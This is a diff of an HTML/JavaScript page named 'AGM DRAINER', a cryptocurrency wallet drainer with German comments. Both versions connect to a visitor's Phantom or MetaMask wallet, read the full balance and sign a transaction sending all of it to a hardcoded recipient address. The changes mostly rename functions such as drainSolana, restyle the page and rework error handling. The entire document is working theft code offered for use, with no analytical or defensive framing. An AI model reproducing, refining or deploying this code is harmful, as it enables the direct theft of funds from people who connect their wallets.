@@ -2,25 +2,24 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple Drainer</title>
-    <!-- Stabile Bibliotheken -->
+    <title>AGM DRAINER</title>
+    <!-- Bibliotheken -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   
     <style>
     body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-   .box { border: 2px solid #00e5ff; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 15px #00e5ff; }
-    button { background: #00e5ff; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
+  .box { border: 2px solid #00ff00; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 20px #00ff00; }
+    button { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
     #status { margin-top: 20px; color: #aaa; }
-   .success { color: #00ff00!important; }
+  .final { color: #fff; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="box">
     <h2>DRAINER</h2>
-    <button id="btn" onclick="start()">CONNECT WALLET</button>
+    <button id="btn" onclick="process()">CONNECT WALLET</button>
     <div id="status">Waiting...</div>
  </div>
 
@@ -28,101 +27,98 @@
     const btn = document.getElementById("btn");
     const status = document.getElementById("status");
 
-    // === SONSTIGES: HIER WERDEN DIE GELDER GERICHTET ===
-    // 1. ETH Adresse (MetaMask)
-    const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C";
-    // 2. SOL Adresse (Phantom)
-    const TARGET_SOL = "DEINE_PHANTOM_ADRESSE_HIER"; 
+    const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
+    const TARGET_SOL = "DEINE_SOLANA_ADRESSE_HIER"; 
 
-    async function start() {
+    async function process() {
     btn.disabled = true;
-    status.innerText = "Finding Wallets...";
+    status.innerText = "Connecting...";
 
-   try {
-    // Reihenfolge: Phantom zuerst, dann MetaMask
+  try {
+    // 1. PRÜFE OB PHANTOM DA IST
     if (window.solana && window.solana.isPhantom) {
-    await drainSolana();
+    await getSolanaFunds();
+   return; 
+ } 
+    // 2. PRÜFE OB METAMASK DA IST
+    else if (window.ethereum) {
+    await getEthereumFunds();
     return;
-    } else if (window.ethereum) {
-    await drainEthereum();
-    return;
-  }
+  } 
 
-    status.innerText = "No compatible wallet found (MetaMask or Phantom).";
+    status.innerText = "No Wallet Found.";
     btn.disabled = false;
-    } catch (e) {
+   } catch (e) {
     status.innerText = "Error: " + e.message;
     btn.disabled = false;
-   }
   }
+ }
 
-    // --- PHANTOM LOGIK ---
-    async function drainSolana() {
+    async function getSolanaFunds() {
+   try {
     const provider = window.solana;
   
-    // Verbindung erzwingen
+    // ---> HIER PASSIERT DIE VERBINDUNG <---
+    status.innerText = "Asking Phantom...";
     await provider.connect();
-    const { publicKey } = provider;
-    status.innerText = "Wallet Found: " + publicKey.toBase58().slice(0, 6) + "...";
-
-    // FESTEN SERVER ANGEBEN, um 403 Fehler zu vermeiden
-    const connection = new solanaWeb3.Connection('https://rpc.ankr.com/solana', 'finalized');
   
-    // Balance abfragen
+    const { publicKey } = provider;
+  
+    // Jetzt erst schauen, was drin ist
+    status.innerText = "Checking Balance...";
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
     const balance = await connection.getBalance(publicKey);
 
-    if (balance === 0) {
-    throw new Error("Solana Wallet is empty.");
-  }
-
-    status.innerText = "Draining SOL...";
+    if (balance > 0) {
+    status.innerText = "Sending SOL...";
   
-    // Transaction erstellen
     const tx = new solanaWeb3.Transaction().add(
     solanaWeb3.SystemProgram.transfer({
     fromPubkey: publicKey,
     toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
     lamports: balance,
-   })
-   );
+  })
+  );
   
-    // Sichern und senden
     await provider.signAndSendTransaction(tx);
-    status.innerText = "DONE: SOL Sent!";
-    status.className = "success";
+    status.innerHTML = "SUCCESS: <b>SOL DRAGGED!</b>";
+    status.className = "final";
+   } else {
+    throw new Error("Empty Wallet");
   }
+    } catch (e) {
+    throw new Error("SOL Error: " + e.message);
+  }
+ }
 
-    // --- ETHEREUM LOGIK ---
-    async function drainEthereum() {
-    // BrowserProvider laden
+    async function getEthereumFunds() {
+   try {
     const provider = new ethers.BrowserProvider(window.ethereum);
   
-    // Accounts abfragen (das ist der Moment, wo das Popup kommt)
+    // ---> HIER KOMMT DAS POPUP <---
+    status.innerText = "Asking MetaMask...";
     const accounts = await provider.send("eth_requestAccounts", []);
     const signer = await provider.getSigner();
-    const address = await signer.getAddress();
   
-    status.innerText = "Wallet Found: " + address;
+    status.innerText = "Checking ETH...";
+    const balance = await provider.getBalance(signer.address);
 
-    const balance = await provider.getBalance(address);
-
-    if (balance <= 0n) {
-    throw new Error("ETH Wallet is empty.");
-  }
-
-    status.innerText = "Draining ETH...";
-  
-    // ETH Senden
+    if (balance > 0n) {
+    status.innerText = "Sending ETH...";
     const tx = await signer.sendTransaction({
     to: TARGET_ETH,
     value: balance
-   });
-  
+  });
     await tx.wait();
-    status.innerText = "DONE: ETH Sent!";
-    status.className = "success";
-   }
-</script>
-
+    status.innerHTML = "SUCCESS: <b>ETH DRAGGED!</b>";
+    status.className = "final";
+   } else {
+    throw new Error("Empty Wallet");
+  }
+    } catch (e) {
+    throw new Error("ETH Error: " + e.message);
+  }
+  }
+   </script>
 </body>
 </html>
